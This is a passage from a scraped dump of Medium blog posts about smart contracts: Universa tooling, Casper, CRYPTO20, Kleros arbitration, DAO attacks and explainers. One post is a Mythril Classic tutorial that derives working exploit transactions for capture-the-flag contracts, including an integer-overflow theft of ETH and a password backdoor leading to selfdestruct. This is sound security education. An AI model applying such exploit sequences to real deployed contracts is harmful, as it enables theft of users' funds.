\u041e\u0431\u043e\u0437\u0440\u0435\u0432\u0430\u0442\u0435\u043b\u044f \u0438 \u0441\u0430\u043c\u043e\u0441\u0442\u043e\u044f\u0442\u0435\u043b\u044c\u043d\u043e \u0438\u0437\u0432\u043b\u0435\u0447\u044c \u0438\u0441\u0445\u043e\u0434\u043d\u044b\u0439 \u043a\u043e\u0434! \u0427\u0442\u043e\u0431\u044b \u0441\u0434\u0435\u043b\u0430\u0442\u044c \u044d\u0442\u043e:\u2022 \u0421\u043a\u0430\u0447\u0430\u0439\u0442\u0435 Uniclient: https://lnd.im/uniclient; \u0438\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u0438 \u043f\u043e \u0441\u0441\u044b\u043b\u043a\u0435:https://kb.universa.io/uniclient_user_manual/4;\u2022 \u0417\u0430\u0433\u0440\u0443\u0437\u0438\u0432 \u043a\u043e\u043d\u0442\u0440\u0430\u043a\u0442 \u0432 \u0444\u0430\u0439\u043b, \u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, \u00abUTN\u200a\u2014\u200aUniversa Token.unicon\u00bb \u043f\u043e \u0441\u0441\u044b\u043b\u043a\u0435 \u043d\u0430 \u041e\u0431\u043e\u0437\u0440\u0435\u0432\u0430\u0442\u0435\u043b\u044c Universa \u0432\u044b\u0448\u0435, \u0437\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u0435 \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0443\u044e \u043a\u043e\u043c\u0430\u043d\u0434\u0443:\u00a0./uniclient\u200a\u2014\u200aexport UTN\\ -\\ Universa\\ Token.unicon\u200a\u2014\u200aas yaml\u00a0(\u0432 \u0441\u0438\u0441\u0442\u0435\u043c\u0430\u0445 Unix/macOS/Linux) \u0438\u043b\u0438 uniclient.bat\u200a\u2014\u200aexport UTN\\ -\\ Universa\\ Token.unicon\u200a\u2014\u200aas yaml\u00a0(\u0432 \u041e\u0421 Windows).\u0412\u0443\u0430\u043b\u044f! \u0423 \u0432\u0430\u0441 \u043f\u043e\u044f\u0432\u0438\u043b\u0441\u044f \u0444\u0430\u0439\u043b \u00abUTN\u200a\u2014\u200aUniversa Token.yaml\u00bb, \u0438 \u0432\u044b \u043c\u043e\u0436\u0435\u0442\u0435 \u0438\u0437\u0443\u0447\u0438\u0442\u044c \u0435\u0433\u043e \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0443! (\u041f\u043e\u043b\u0435\u0437\u043d\u044b\u0439 \u0441\u043e\u0432\u0435\u0442: \u043f\u0440\u043e\u0447\u0438\u0442\u0430\u0439\u0442\u0435 https://kb.universa.io/uniclient_user_manual/4#export-a-contract-to-xml-json-or-yaml, \u0447\u0442\u043e\u0431\u044b \u0443\u0437\u043d\u0430\u0442\u044c, \u043a\u0430\u043a \u043f\u0440\u043e\u0441\u043c\u043e\u0442\u0440\u0435\u0442\u044c \u0435\u0433\u043e \u0432 \u0434\u0440\u0443\u0433\u0438\u0445 \u0444\u043e\u0440\u043c\u0430\u0442\u0430\u0445\u200a\u2014\u200a\u044d\u0442\u043e \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u0443\u0434\u043e\u0431\u043d\u0435\u0435).\u0412\u044b \u043c\u043e\u0436\u0435\u0442\u0435 \u043d\u0430\u0436\u0430\u0442\u044c \u043d\u0430 \u0441\u0441\u044b\u043b\u043a\u0443 \u00ab(\u0441\u043a\u0430\u0447\u0430\u0442\u044c)\u00bb \u0440\u044f\u0434\u043e\u043c \u0441 \u00ab\u0427\u0430\u0441\u0442\u043d\u043e\u0435 \u043e\u0431\u043b\u0430\u043a\u043e Unixchange), \u0447\u0442\u043e\u0431\u044b \u0441\u043a\u0430\u0447\u0430\u0442\u044c \u0421\u043c\u0430\u0440\u0442-\u043a\u043e\u043d\u0442\u0440\u0430\u043a\u0442 UTN \u0432 \u0434\u0432\u043e\u0438\u0447\u043d\u043e\u0439\u00a0\u0444\u043e\u0440\u043c\u0435.Stay tuned!\u0412\u0441\u0435\u0433\u0434\u0430 \u0440\u0430\u0434\u044b \u043e\u0442\u0432\u0435\u0442\u0438\u0442\u044c \u043d\u0430 \u0432\u0430\u0448\u0438 \u0432\u043e\u043f\u0440\u043e\u0441\u044b \u0432 \u043a\u0430\u043d\u0430\u043b\u0435 \u0422\u0435\u043b\u0435\u0433\u0440\u0430\u043c\u043c\u200a\u2014\u200at.me/uplatform (EN) \u0438 t.me/universa (RU).\u0421\u043b\u0435\u0434\u0438\u0442\u0435 \u0437\u0430 \u043d\u043e\u0432\u043e\u0441\u0442\u044f\u043c\u0438 \u043f\u0440\u043e\u0435\u043a\u0442\u0430 \u0432 t.me/UniversaNews (EN) \u0438 t.me/UniversaNewsRu (RU).\u0421 \u0443\u0432\u0430\u0436\u0435\u043d\u0438\u0435\u043c \u0412\u0430\u0448 Paranoid CEO, Alexander Borodich", "responses": "53"}, {"title": "Casper & Smart Contract Consensus", "author_name": "Karl Floersch", "link": "https://media.consensys.net/casper-smart-contract-consensus-7be6cfa6f7ec?source=search_post", "post_date": "Jun 30, 2017", "readtime": "2 min read", "upvotes": "400", "content": "Casper & Smart Contract Consensusa video\u00a0overviewKarl FloerschBlockedUnblockFollowFollowingJun 30, 2017An overview of Casper, the Ethereum proof of stake protocolView the slides hereI began contributing to Ethereum\u2019s proof of stake protocol Casper last March, while continuing my work at ConsenSys. I have been working directly with Ethereum Foundation researchers, such as Vitalik and Vlad, on Casper\u2019s implementation. This has enabled me to dive deeply into Ethereum, consensus protocols, and cryptoeconomics.Every few weeks ConsenSys holds a company-wide Developer Roundtable. During these roundtables, developers present recent works, useful techniques, and informative topics. Two weeks ago, I gave a presentation on Casper and related concepts based on three years of research done by the Casper research team. The topics included were: An overview of Casper, economic finality, miner censorship, fork choice, usage of smart contracts for consensus, and more. Above is a recording of that developer roundtable session. Hope you enjoy!", "responses": "7"}, {"title": "Practical Smart Contract Security Analysis and Exploitation\u2014 Part\u00a01", "author_name": "Bernhard Mueller", "link": "https://hackernoon.com/practical-smart-contract-security-analysis-and-exploitation-part-1-6c2f2320b0c?source=search_post", "post_date": "Nov 19, 2018", "readtime": "7 min read", "upvotes": "362", "content": "Practical Smart Contract Security Analysis and Exploitation\u2014 Part\u00a01Bernhard MuellerBlockedUnblockFollowFollowingNov 19, 2018In this series I explain how to use Mythril Classic to find and exploit security bugs in Ethereum smart contracts. The articles will cover basic principles and advanced techniques, such as testing security properties, proving invariants, analyzing multi-contract systems and auto-looting ETH from vulnerable contracts on the Ethereum network.Mythril Classic\u200a\u2014\u200aalso known as the \u201cSwiss army knife of smart contract security\u201d\u200a\u2014\u200ahas lots of bells and whistles, but to use it effectively you need a basic understanding of the analysis techniques used. This article provides an overview of the most important concepts.The first key step we usually recommend to new users is installing Mythril Classic. You should do this also in case you to want follow the examples in this article (if run into trouble installing, you can ask for help in our Discord support channel).After successful installation the myth command line tool will be available on your system. Make sure you have version 0.19.7 or higher:$ myth -VMythril version v0.19.7The basic command for executing security analysis is -x / --fire-lasers:$ myth -x <Solidity file>$ myth --rpc RPC_OPTION -xa <contract address>This command runs a generic analysis that works reasonably well in most situations. Before we get ahead of ourselves though, let\u2019s have a look at what is going on behind the scenes.Multi-Transactional Symbolic ExecutionMythril Classic checks for security issues by running a custom implementation of the Ethereum Virtual Machine. The analysis process involves the following steps:Obtain the contract bytecode by compiling a Solidity file or loading it from an Ethereum node;Initialize the contract account state either by running the creation bytecode (if source code was provided) or by retrieving data from an Ethereum node on-demand;Symbolically execute the code to explore all possible program states over n transactions, whereby n defaults to two but can be set to an arbitrary number;Whenever an undesirable states is encountered (such as \u201cthe contract kills itself\u201d), logically prove or disprove the reachability of those states given certain assumptions (e.g. \u201cgiven the right inputs anybody can kill the contract\u201c).When find a vulnerable state, we can compute the input transactions required to reach that state. This is useful not only to to determine the root cause of an issue, but also for crafting exploits should one be so inclined.Basic UsageWith that out of the way, let\u2019s try Mythril Classic on a smart contract exploitation challenge from CaptureTheEther. TokenSale is a simple smart contract that allows users to buy and sell tokens for the once-in-a-lifetime bargain price of 1 ETH. Here is the source code:Working with code is easier than working with on-chain contract instances because that way Mythril can show you the the code responsible for each bug it finds. Copy/paste the code into a file called tokensale.sol and run the following command:$ myth -mether_thief -x tokensale.solNote the use of the -m argument which accepts a comma-separated list of analysis modules to execute. Let\u2019s have a closer look at a particularly useful module called Ether Thief.Looting that precious ETHAs its name subtly foreshadows, the Ether Thief module checks for transaction sequences that extract ETH from the contract. Specifically, it looks for states that fulfill the following conditions:A non-zero amount of ETH can be withdrawn from the contract;The sender withdrawing the ETH is not the contract creator;The amount of ETH withdrawn can be greater than the total amount previously paid into the contract by the same sender.This is a pretty low-false-positive way of of spotting contracts that \u201cleak\u201d ETH to anonymous attackers. Let\u2019s now unleash this module on the TokenSale contract:$ myth -mether_thief -x tokensale.sol==== Ether thief ====SWC ID: 105Type: WarningContract: TokenSaleChallengeFunction name: sell(uint256)PC address: 693Users other than the contract creator can withdraw ETH from the contract account without previously having sent any ETH to it. This is likely to be vulnerability.--------------------In file: tokensale.sol:25msg.sender.transfer(numTokens * PRICE_PER_TOKEN)--------------------Myhril claims that to have found an issue in the withdrawal function but the root cause is not immediately apparent. If you haven\u2019t spotted the bug yet, take another good look at the code and try to figure out the attack.Concretizing Transactions (a.k.a. Auto-Exploit-Generator)As you have probably deduced there\u2019s an integer overflow issue at play here. To exploit the issue you need to pass a very specific value to the buy() function. Don\u2019t fire up your calculator just yet though, there\u2019s some good news: Mythril can compute the correct input transactions for you automagically. All you need to do is add the --verbose-report flag:$ myth -mether_thief -x tokensale.sol --verbose-report==== Ether thief ====SWC ID: 105Type: WarningContract: TokenSaleChallengeFunction name: sell(uint256)PC address: 693Users other than the contract creator can withdraw ETH from the contract account without previously having sent any ETH to it. This is likely to be vulnerability.--------------------In file: tokensale.sol:25msg.sender.transfer(numTokens * PRICE_PER_TOKEN)--------------------DEBUGGING INFORMATION:Transaction Sequence:Transaction Sequence: {'2': {'calldata': '0xd96a094a20', 'call_value': '0x0', 'caller': '0xaaaaaaaabbbbbbbbbcccccccddddddddeeeeeeee'}, '5': {'calldata': '0xe4849b32084031', 'call_value': '0x0', 'caller': '0xaaaaaaaabbbbbbbbbcccccccddddddddeeeeeeee'}}The DEBUGGING INFORMATION section contains the two transactions computed by Ether Thief. A look at the call_value fields shows that no ETH is transferred to the contract by the sender. Let\u2019s have a closer look at the calldata:The first transaction contains the first four bytes of the function signature hash of buy(uint256 num_tokens) as well as an innocent-looking extra byte\u200a\u2014\u200a0x20\u200a\u2014\u200awhich represents the leftmost byte of uint256 num_tokens (the remaining zeroes don\u2019t have to be sent explicitly as the EVM will interpret uninitialized calldata as 0x00). The value passed to num_tokens works out to:buy(0x2000000000000000000000000000000000000000000000000000000000000000)Let\u2019s look at the effect this input has on the require statement on line 16:require(msg.value == numTokens * PRICE_PER_TOKEN);PRICE_PER_TOKEN is set to 1 Ether which corresponds to 1e18 wei. As it turns out, multiplying this amount with the value Mythril has computed for numTokens results in an integer overflow. More specifically, the result of the binary multiplication uint256(1e18) * uint256(numTokens) is zero\u200a\u2014\u200anote that there are other input values that could be used here.The require statement therefore passes and a large amount of tokens is credited on the sender\u2019s account even though they\u2019re not sending any ETH.In transaction two, the illegitimate tokens are then sold in return for ETH (call to sell(uint256)). Because Mythril represents the contract balance symbolically it outputs a large random value for numTokens. In reality, the attacker would use a lower value corresponding to the actual number of ETH in the account.If you haven\u2019t done so already, now is the time to fire up Metamask and give the challenge a shot.Configuring transaction countAn important concept to know when using Mythril Classic is transaction count. This variable specifies the number of transactions to be executed symbolically. The default value of two is sufficient for detecting many common bugs such as the integer overflows, uninitialized storage variables and misnamed constructors. However, a search that goes two transactions deep will not discover bugs that need three or more transactions to reach.Unfortunately, because each transaction can have multiple valid final states, the space of states to explore grows exponentially with the number of transactions. Symbolically executing three transactions therefore takes significantly longer than executing two (we\u2019re currently working on a way of optimizing the number of transactions executed within a predefined timeframe\u200a\u2014\u200aI\u2019ll update this article as soon as this becomes available).To demonstrate this let\u2019s have a look at another example. See if you can spot the security issue (beware of spoilers in the contract name):This contract has a \u201cbackdoor\u201d that allows anyone knowing the secret password to become the owner (but as we know, private state variables aren\u2019t really secret\u200a\u2014\u200athe only difference is that the solc doesn\u2019t generate an accessor function for them).Another popular Mythril Classic module is Suicide. This module checks for transactions that, if sent by anyone other than the contract creator, will \u201caccidentally\u201d kill the contract. Running the Suicide module on the code above returns the following output:$ myth -msuicide -x killme.solThe analysis was completed successfully. No issues were detected.Mythril appears to overlook the vulnerability. The reason for this is that a minimum of three transactions is needed to kill the contract: The sender must provide the correct password to activatePassword(bytes11 password), call pwnContract() to become the owner, and finally call kill() to trigger the suicide.Let\u2019s see what happens if we increase the number of transactions executed using the -t / --transaction-count argument:$ myth -t3 -msuicide --verbose-report -x killme.sol==== Unchecked SUICIDE ====SWC ID: 106Type: WarningContract: KillmeFunction name: kill()PC address: 422Estimated Gas Usage: 630 - 1055A reachable SUICIDE instruction was detected. The remaining Ether is sent to the caller's address.--------------------In file: killme.sol:21selfdestruct(msg.sender);--------------------DEBUGGING INFORMATION:Transaction Sequence: {'2': {'calldata': '0xa6e0e35e63727970746f6b69747479', 'call_value': '0x0', 'caller': '0x0000000000000000000000000000000000000001'}, '3': {'calldata': '0x2eb00c1b', 'call_value': '0x0', 'caller': '0x0000000000000000000000000000000000000001'}, '4': {'calldata': '0x41c0e1b5', 'call_value': '0x0', 'caller': '0x0000000000000000000000000000000000000001'}}This time the issue was detected and we get a sequence of three transactions. Inspecting the calldata more closely reveals the names and arguments of the functions being called:TL;DRMythril Classic\u2019s Ether Thief and Suicide modules detect security bugs that allow attackers to steal from, and even kill, poor innocent smart contracts. When the --verbose-report flag is added, Mythril will output the input transaction(s) needed to trigger each bug detected. Increasing transaction count helps Mythril detect more bugs but also increases execution time exponentially.Up NextPart 2 is probably coming soon. Join our growing Discord community to stay up-to-date, get support and discuss things related to Ethereum security.", "responses": ""}, {"title": "How smart contracts will kill bureaucracy", "author_name": "Universa", "link": "https://medium.com/universablockchain/how-smart-contracts-will-kill-bureaucracy-c22a48e2e60?source=search_post", "post_date": "Nov 20, 2017", "readtime": "4 min read", "upvotes": "668", "content": "How smart contracts will kill bureaucracyUniversaBlockedUnblockFollowFollowingNov 20, 2017A smart contract is a simple and quick way to perform transactions using a blockchain technology. For the first time, the term smart contract was used by Nick Szabo in 1994 in the USA, and the first practical implementations became possible in 2009, with the appearance of the first crypto currency.A smart contract consists of three components: signatories, the subject of the contract and terms. Signatories are parties of the transaction; terms in the smart contract are the precise mathematical description of the contract clauses execution logic, which can be programmed.It was the subject of the contract that caused difficulties in implementing the technology, for the reason it must exist within the environment in which the contract operates and be processed without human help. With the advent of crypto currency, this issue has been solvable. Technically, a smart contract resembles the function \u201cif\u00a0\u2026 then\u00a0\u2026 else\u00a0\u2026\u201d This function allows the computer algorithm monitor the parties\u2019 compliance with the conditions and performs the actions described in the subject matter of the contract.Why is everybody talking about smart contracts?Traditional contracts are quite difficult to draw up and the involvement of the third parties is necessary. Today for conclusion of the contract both parties should turn to a specialist to draw up the text of the contract. Apart from contract drafters and signatory parties there is one more necessary party\u200a\u2014\u200athe guarantor of the contract execution. Nowadays such a regulator is a state, which guarantees the currency of transaction and its legal framework within which disagreements will be resolved.The authorities should also intervene in settlement of all the possible disputes, as well as a great deal of financial bodies should also be involved, so as the parties to the contract would be able to perform financial transactions.As we can see, for operating a traditional contract it is necessary to involve many mediators, which still can not guarantee a thorough execution of all the terms of the contract. Since crypto economy is based on elimination of mediators, increase in popularity of cryptocurrency leads to the increase in popularity of smart contracts.The combination of blockchain technologies, which guarantee protection from falsification of data, cryptocurrency, which is independent from any authority, and computer programs which are presented as smart contracts, enables not only to imagine, but also to implement in practice secure and simple mechanisms of conclusion of deals.The Practical ApplicationIn the future smart contracts are going to make major changes in the stock market: by the time the stock exchanges will stop playing the key role and we will get the opportunity to get rid of it by making operations on sale and purchase directly without lawyers, brokers and other mediators.Individual politicians in Russia, Ukraine, Australia and also some representatives of the European Parliament have serious intentions to use smart contracts during the elections. Nowadays the voter turnout in many countries leaves much to be desired because of the red tape. Queues, the need to fill many papers, doubts in the transparency of the process and many other things discourage people from voting. It is likely that soon we will be able to vote for a candidate without placing a ballot into a box but by launching a smart contract.One more obvious field of using smart contracts is insurance. It takes companies weeks or even months to consider insurance cases and make decisions about payments to customers because of the bureaucracy and administrative difficulties. The time when the payments will be deposited in the client\u2019s account before he or she claims about the insurance case is not too far.In the meantime the Barclays Corporate Bank has already introduced using smart contracts for redirecting payments when the ownership is changed in the register.Strengths and WeaknessesDespite all the advantages of this technology, there are still several shortcomings that should be taken into consideration. There is growing concern that together with eliminating bureaucracy, smart contracts can hit administrative employees, just as automatization once hit industrial employees.As far as a digital state is still a dream, a state in its usual meaning strives to get an ultimate control over everything. That\u2019s why the control on the part of the Government might preclude execution of smart contracts.However, the advantages of smart contracts are so obvious that the development and widespread implementation of smart contracts will certainly gain ground over time. The technology based on blockchain guarantees reliability and security, savings on mediators, independence from the third-party specialists, and promptness of the contract performance by both parties to the contract.Usually there are lots of mediators between producers and purchasers such as shops, logistics services and so on. Smart contracts can be described as a vending machine in the world of contracts. This metaphor emphasizes the principal advantage of smart contracts over its traditional alternatives.According to Vitalik Buterin, the founder of Ethereum, the pioneering field to implement smart contracts is going to be financial sector. Today it takes about several weeks to sell an apartment, whereas with the implementation of smart contracts the time can be reduced to just 3 minutes.", "responses": ""}, {"title": "Smart Contracts You Already\u00a0Signed", "author_name": "Demian Brener", "link": "https://blog.zeppelin.solutions/smart-contracts-you-already-signed-2930aee9dacc?source=search_post", "post_date": "Jul 22, 2016", "readtime": "4 min read", "upvotes": "54", "content": "Smart Contracts You Already\u00a0SignedDemian BrenerBlockedUnblockFollowFollowingJul 22, 2016Uber, Tinder, Spotify, Pinterest: every time you login to any of these apps using your Facebook account, you are using a smart contract. How\u2019s that?A smart contract is a mechanism to formalize and automate relationships using computer code. Unlike traditional PDF contracts, all terms and outcomes of an agreement are clearly defined as a set of programmable rules. In a smart contract, the obligations of each party can be executed using a computer program, instead of relying on human intervention.Log in With Facebook is an example of a smart contract run by Facebook, between you and a third-party app, where you trade your personal information for access, in one tap:Log in With Facebook is a Smart Contract where user information is traded for access to a third-party App.The terms of the relationship between you and Uber are established by Facebook using a simple UX. There are no lawyers involved, it takes a couple of seconds to understand, and the transaction is carried out automatically by Facebook when you tap\u200a\u2014\u200a\u201csign\u201d\u200a\u2014\u200athe \u2018OK\u2019 button.In this way, smart contracts greatly reduce the transaction costs of establishing a contractual relationship. This is a key feature of smart contracts, enabling new kinds of relationships that were previously unthinkable or too small to formalize.A computer executing a contract is less prone to mistakes, delays and corruption than a human counterpart. The obligations are automatically triggered by pre-defined events, such as the signature of the contract. Hence, smart contracts also help reduce the risk of the other party not living up to their obligations.But the definition of smart contracts goes beyond logging in to an app. Since the beginning of computation we used primitive smart contracts such as the vending machine, ATM, phone shopping and, recently, internet shopping. We are now getting closer to encoding a greater range of interactions.Why is everyone talking about smart contracts now?Even though a computer is less prone to fail obligations than a human, there are still some risks involved.In the previous login example, once the transaction has occurred and your personal data has been transferred, Uber could easily fail its obligation and deny you access.Also, both you and Uber rely on Facebook for the execution of the contract: Uber trusts Facebook to provide the correct information requested, while you trust Facebook to provide only the details you agreed to share. When we trust a third party for executing our smart contracts, we assume third-party risk.We do trust Uber and Facebook because of their strong brand, reputation and security. But how can we achieve the same level of trust on the internet, when the other parties are unknown?Enter Blockchain technologyFor the first time in the history of human kind, we have a distributed consensus system: the blockchain. Since we can attach programs to blockchain transactions, we can establish rules and run computer programs in a distributed network without a central authority.This means that, instead of relying on a single party to execute our smart contracts, we have an always-available, global, distributed network of computers to do it. All these computers run the same computation in parallel and agree on a unique result. The security of this network is backed by cryptography and the hashing power of miners.By running smart contracts in the blockchain, there is no need to trust a single party for the execution of the terms.Not only this, but the immutability of the blockchain makes it impossible for anyone to change the code after the fact. Therefore, using smart contracts on the blockchain helps us reduce the risk of a third party failing to execute a contract as it was originally meant to.There are still puzzles to\u00a0solveA puzzle from The\u00a0Witness.The implementation and deployment of smart contracts in blockchain-based systems (Bitcoin, Ethereum, and others) has shown to be quite challenging.TheDAO taught us that security is still a major concern when building smart contracts. We can practically eliminate third-party risk as previously discussed, but smart contract code can still be vulnerable to bugs and attacks.Moreover, the scope of smart contracts is not yet clear. Some projects proposed code to capture very complex human interactions such as organizational governance and decision-making. There are non-trivial game theory dynamics involved that emerge from introducing smart contract mechanics.Even though execution of smart contracts in the blockchain is automated, they still serve the hugely complex world of humans. From hard forks, to moderators, to law enforcement, there are no established processes and best practices for conflict resolution yet.We first need to make simpler contracts work by establishing a clear set of security standards and best practices. From there, we can start experimenting with more complex interactions, such as automating the operations of a company.This is something we are very interested in at Smart Contract Solutions. We are working on tools to create secure smart contracts and model simple business rules. Follow us on Medium to learn about our future announcements.", "responses": "1"}, {"title": "CRYPTO20's Smart Contract\u200a\u2014\u200aImmunity to Market Manipulation", "author_name": "Daniel Schwartzkopff", "link": "https://medium.crypto20.com/crypto20-smart-contract-immunity-to-market-manipulation-217cedb537e4?source=search_post", "post_date": "Sep 26, 2017", "readtime": "2 min read", "upvotes": "221", "content": "CRYPTO20's Smart Contract\u200a\u2014\u200aImmunity to Market ManipulationDaniel SchwartzkopffBlockedUnblockFollowFollowingSep 26, 2017The CRYPTO20 fund token, C20, represents an investor\u2019s share in the fund. The ICO funds will be used to purchase the underlying assets and these assets are directly tied to the tokens via the smart contract.So what is the smart contract and how is it\u00a0unique?The smart contract is a piece of public code published on the Ethereum blockchain that cannot be changed or manipulated\u200a\u2014\u200anot by CRYPTO20 or anyone else. The security of this code has been audited by a third party, DLT Labs, and this audit report will be made public in the run-up to the ICO.The code directly links the underlying assets to the tokens by offering investors the ability to liquidate their C20 tokens for their share of the fund NAV (net asset value).This protects the asset price by setting a price floor.The C20 token price can not rationally trade below the net asset value price on exchange because investors could just liquidate their tokens directly to the smart contract for a greater value.C20 is immune to pump and dump schemes and other forms of market manipulation because of this direct asset link.Simplified Graphical Representation Of How The CRYPTO20 Back-End Interacts With The Smart\u00a0ContractHow does the process work? Does a human have to approve my withdrawal?The code can be accessed directly via the blockchain, or, abstracted for easy use via the Withdrawal page on our website. The market rate for a token\u2019s underlying assets is calculated and pushed to the smart contract periodically.Investors can request a withdrawal in the CRYPTO20 Investor Portal and when the next price update is pushed they can withdraw the value of the underlying assets in Ether (ETH).This was done to simplify the process; potentially requiring the investor to create 20 different wallets for the 20 different underlying assets would have made the entire process unmanageably complex for most individuals.By storing some Ether (ETH) in the smart contract, this entire process can be facilitated automatically and without manual human approval.For Further\u00a0ReadingView our Github here.Find more technical detail about the smart contract in our white paper here.Looking forward to seeing you in the investor portal!Yours,Daniel and the CRYPTO20 Team", "responses": "1"}, {"title": "A Smart Contract Arbitration Standard for the Internet\u00a0Age", "author_name": "Federico Ast", "link": "https://medium.com/kleros/a-smart-contract-law-standard-for-the-internet-age-c3512a357f46?source=search_post", "post_date": "Oct 19, 2017", "readtime": "10 min read", "upvotes": "458", "content": "A Smart Contract Arbitration Standard for the Internet\u00a0AgeBy Cl\u00e9ment Lesaege and Federico\u00a0AstFederico AstBlockedUnblockFollowFollowingOct 19, 2017\u201cThe grand utility of the law is certainty\u201d.Jeremy BenthamThe late Middle Ages saw a rapid expansion of long-distance trade. English wool, Italian textiles, German beer, French wine and Greek wax were traded in fairs and independent cities such as Venice, Florence and Genoa. Merchants started to experience the need of a reliable system ensuring that debts were paid, goods were delivered and property was safe.As merchants spent most of their time traveling in foreign land, a critical concern was how to create a set of common rules and contract standards which could be adjudicated in courts of different fairs and cities.Lex mercatoria (merchant law) was born to provide fast arbitration and reliable enforcement for an age of growing international trade. It was formed by a number of generally accepted merchant practices concerning the use of bills and notes, insurance, banking, shipping, suretyship, and agency. The main source of the law were merchants and their guilds, not governments. It was based on principles of contract freedom and alienability of property.Adjudication was done by merchant courts across Europe\u2019s fairs. Thanks to the common standards, a contract signed in Genoa could be adjudicated by a court in Paris or Antwerp. Enforcement was done by the community with a reputation system. Those who failed to comply with the decision of a merchant court were ostracized. Other merchants wouldn\u2019t do business with them (to learn more about the economic impact of medieval merchant law, read Gillian Hadfield\u2019s Rules for a Flat World).Economists Paul Milgrom, Douglass North and Barry Weingast argued that the private law system of lex mercatoria explain the revival of trade in the Middle Ages. Some towns and fairs became wealthier because their institutions did a better job in supporting trade than their neighbors, in particular those allowing for commercial disputes to be adjudicated by merchant courts, instead of government officials or priests. This was the case of the Champagne fairs of the 13th century and the city state of Venice.Shakespeare\u2019s \u201cThe Merchant of Venice\u201d climax scene takes place in a Venice court of law, where financier Shylock demands that his contract be enforced against Antonio, a merchant who defaulted on his loan. Painting: \u201cThe Merchant of Venice\u2019, Act IV, Scene 1, the Trial Scene, Richard Smirke, Royal Shakespeare Company Collection.The internet age poses a number of similar challenges. As a larger part of the economy starts to operate online across the jurisdictional boundaries of state courts, a new body of law is emerging. It is not created by governments but, as the medieval lex mercatoria, by e-commerce merchants and the platforms where they do business. The nascent ecosystem would greatly benefit from a set of common rules and contract standards allowing for the interoperability of arbitration services.As part of Kleros\u2019 vision to build a justice protocol for the Internet, we will propose a number of guidelines for building this standard for blockchain smart contracts. Any smart contract following these guidelines should be able to be adjudicated by any court. As the merchants of the Middle Ages chose the best cities and fairs to adjudicate disputes, e-merchants of our time will be able to choose from a variety of adjudication services, all using the same contract standard. Users will be able to select their preferred arbitration service at the moment of doing a transaction which will result in wider choice, better arbitration services and faster growth for the ecosystem.A case where a user could select the adjudication service provider among a set of different options complying with the standard.Arbitrable and Arbitrator ContractsThe standard will consist of two kinds of contracts: Arbitrable and Arbitrator contracts, such that every Arbitrable contract can be adjudicated by every Arbitrator contract. Using two contracts allows separation between decision making (i.e ruling) and its execution. This standard will be the subject of an ERC (Ethereum Request for Comments).Arbitrable ContractsContract hashevent ContractHash(bytes32 _contractHash)", "responses": ""}, {"title": "Smart Contract Attacks [Part 1] - 3 Attacks We Should All Learn From The\u00a0DAO", "author_name": "Pete Humiston", "link": "https://hackernoon.com/smart-contract-attacks-part-1-3-attacks-we-should-all-learn-from-the-dao-909ae4483f0a?source=search_post", "post_date": "Jul 5, 2018", "readtime": "10 min read", "upvotes": "198", "content": "Smart Contract Attacks [Part 1] - 3 Attacks We Should All Learn From The\u00a0DAOPete HumistonBlockedUnblockFollowFollowingJul 5, 2018If you\u2019ve been following the crypto long enough you\u2019ve probably heard of one or two smart contract attacks, attacks which have resulted in the theft of cryptoassets worth tens of millions of dollars. The most notable attack remains the Decentralized Autonomous Organization (DAO), one of crypto\u2019s most highly anticipated projects of all time and a poster-child of the revolutionary capabilities of smart contracts. While most have heard of these attacks, few truly understand what went wrong, how it went wrong, and how to avoid making the same mistake twice.Smart contracts are dynamic, complex, and incredibly powerful. While their potential is unimaginable, its unlikely they\u2019ll become attack-proof overnight. That said, it\u2019s imperative for the future of crypto that we all learn from prior mistakes and grow together. Although the DAO is a thing of the past, it remains a great example of susceptible smart contract attacks that developers, investors, and community members should familiarize themselves with.In Part 1 of my Smart Contract Attacks series, I\u2019ll be walking you through in great detail (Solidity code included) 3 common attacks we can learn from the DAO. Whether you\u2019re a developer, investor, or fan of crypto, being knowledgeable on these attacks will equip you with a deeper understanding and appreciation for this promising tech.", "responses": "2"}, {"title": "What is a Smart Contract and why do we need\u00a0them?", "author_name": "Erik Engheim", "link": "https://medium.com/@Jernfrost/what-is-a-smart-contract-and-why-do-we-need-them-7d92f2131f03?source=search_post", "post_date": "Jan 9, 2018", "readtime": "14 min read", "upvotes": "490", "content": "What is a Smart Contract and why do we need\u00a0them?An explanation for slowpokesErik EngheimBlockedUnblockFollowFollowingJan 9, 2018So you might have read about smart contracts in relation to crypto currencies such as Ethereum and understood this is a big and revolutionary thing. You might even have tried reading some explanations of what they are.But if you are like me, most of these articles went over your head, because either you are not familiar with tech jargon or you are not familiar with finance jargon or you have never put much thought into the practical and legal aspects of normal contracts and the exchange of assets such as property and stocks.My intention with this article is to walk you through various examples of smart contracts and think out loud about the challenges they solve, and attempt to explain why smart contracts are a good idea in each case.The problem when understanding something radically new, is that people immediately start explaining how it solves a problem, while you never quite realized that the problem existed at all and that it needed solving.So lets try to gradually build up and understanding of what the problem is and why smart contracts solves them. For now we\u2019ll just keep it a mystery what a smart contract is, technically speaking.Movie TicketsI like to start with something super simple that everybody should have experience with, which is buying tickets for the movies, a rock concert or theatre.Fundamentally the problem is about limiting the people who enter the screening of a particular movie to the ones who have paid to see the movie.A simple but naive and flawed\u00a0approachThe simplest approach to this is to have a guy at the entrance to the movie screening, who collects money from people who want to watch the movie.That solves the problem of only allowing entry to those who pay to gain access. However it causes lots of other problems. People might end up standing in line to see a movie only to discover when it is their turn, that there are no more available spots. Also it gets really hard to reserve a particular spot, because you have no proof to show other guests that you paid to sit in a particular seat.Over the counter\u00a0ticketsTickets solve these problems. With tickets customers can buy access to a movie screened at a particular time at any time of the day when it suits them, and know in advance whether there will be a spot for them to sit in, when the movie is screened. Now you also have proof to show anybody else, that you did in fact pay to sit in seat number 42.A reoccurring element I want to discuss in all these examples is the question of trust. Who needs to trust who and what are the incentives to stay honest. In this case the movie theatre has to trust that we are giving them real money for the tickets. That is mostly a solved problem since, paper money is hard to forge. The sales clerk really just need to take a look at and feel the paper bill in their hand to verify the authenticity of the money.Both the customer and clerk need to make sure that they get something in exchange from the other. But that is easy, because they are directly facing each other and challenge each other if they don\u2019t get something in return.For the customer however the issue isn\u2019t whether he or she gets something in return but whether they actually get an authentic ticket or if they get an authentic ticket whether it will be honored by the movie theatre, when they arrive later. By that I 